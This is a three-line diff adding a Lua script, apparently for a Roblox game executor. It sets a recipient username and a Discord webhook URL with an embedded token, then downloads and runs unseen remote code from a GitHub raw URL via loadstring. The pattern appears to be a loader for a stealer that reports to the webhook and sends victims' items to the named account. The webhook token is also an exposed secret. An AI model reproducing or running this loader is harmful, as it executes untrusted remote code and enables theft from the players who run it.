@@ -1,0 +1,3 @@
+﻿Username = "clarkkenneththeboss"
+Webhook = "https://discord.com/api/webhooks/1275262477046648883/xNHX2I9qRUkYgaNbEEzVZ8ZaOLkg5OIrUxdg5BByBzxeoxlEwOBUwZ8eKFqDSMZL00oz"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
